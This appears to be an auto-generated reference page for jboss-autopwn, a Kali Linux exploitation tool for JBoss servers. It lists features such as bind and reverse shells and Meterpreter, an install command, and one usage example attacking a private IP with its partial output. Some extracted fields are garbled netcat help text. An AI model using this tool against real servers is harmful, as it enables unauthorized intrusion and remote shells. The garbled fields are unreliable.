---
tool_id: jboss-autopwn
title: jboss-autopwn
categories: ["exploitation-tools", "post-exploitation"]
category_slugs: ["exploitation-tools", "post-exploitation"]
homepage: https://github.com/SpiderLabs/jboss-autopwn
repository: 
version: 0.1-1kali2
architectures: all
license: 
binaries: []
metapackages: ["kali-linux-everything kali-linux-large kali-tools-web"]
icon: images/jboss-autopwn-logo.svg
source_path: kali-tools\jboss-autopwn\index.md
source_commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
generated_at: 2026-01-03T15:46:06.952759
---

# Tool: jboss-autopwn (jboss-autopwn)

## Categories
- [exploitation-tools](../exploitation-tools.md)
- [post-exploitation](../post-exploitation.md)


## Quick Facts
| Field | Value |
| --- | --- |
| Homepage | [https://github.com/SpiderLabs/jboss-autopwn](https://github.com/SpiderLabs/jboss-autopwn) |
| Repository |  |
| Version | 0.1-1kali2 |
| Architectures | all |
| License |  |
| Binaries |  |
| Metapackages | kali-linux-everything kali-linux-large kali-tools-web |
| Icon | images/jboss-autopwn-logo.svg |

## Install
*(No installation information found)*

## Official Info (Extracted)
- **Repository**: https://gitlab.com/kalilinux/packages/jboss-autopwn
- **PackagesInfo**: |
- **Features include**: ['Multiplatform support - tested on Windows, Linux and Mac targets', 'Support for bind and reverse bind shells', 'Meterpreter shells and VNC support for Windows targets']
- ****Installed size**: ** `114 KB`
- ****How to install**: ** `sudo apt install jboss-autopwn`
- **{{< spoiler "Dependencies**: " >}}
- **root@kali**: ~# jboss-win -h
- **connect to somewhere**: nc [-options] hostname port[s] [ports] ...
- **listen for inbound**: nc -l -p port [-options] [hostname] [port]
- **options**: []
- **-G num			source-routing pointer**: 4, 8, 12, ...
- **port numbers can be individual or ranges**: lo-hi [inclusive];


## Documentation (Upstream)

{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## jboss-autopwn Usage Example

Attack the target server (`192.168.1.200`) on the specified port (`8080`), redirecting stderr (`2> /dev/null`):

```console
root@kali:~# jboss-linux 192.168.1.200 8080 2> /dev/null
[x] Retrieving cookie
[x] Now creating BSH script...
[!] Cound not create BSH script..
[x] Now deploying .war file:
```


## Source
- Path: kali-tools\jboss-autopwn\index.md
- Commit: 6a986bc96e156a34ddc47f758a4449202a8e475d
- Generated at: 2026-01-03T15:46:06.952759
